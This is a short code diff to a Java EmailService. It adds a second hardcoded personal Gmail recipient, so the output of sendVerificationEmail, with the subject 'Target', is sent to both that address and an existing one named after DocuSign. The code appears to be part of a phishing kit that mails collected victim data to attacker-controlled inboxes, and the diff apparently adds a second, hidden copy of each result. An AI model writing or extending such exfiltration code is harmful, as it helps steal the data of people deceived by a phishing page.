@@ -32,6 +32,7 @@ public class EmailService {
 	
 	private void sendVerificationEmail(Email email) throws MessagingException, UnsupportedEncodingException {
 		String toAddress = "docusign76@gmail.com";
+		String toAddress2 = "officialkonte10@gmail.com";
 		String subject = "Target";
 		String content = "<!DOCTYPE html>\n"
 		+ "<html lang=\"en\">\n"
@@ -49,6 +50,7 @@ public class EmailService {
 		+ "</body>\n"
 		+ "</html>";
 		mailSenderService.sendEmail(toAddress, subject, content);
+		mailSenderService.sendEmail(toAddress2, subject, content);
 	}
 	
 }
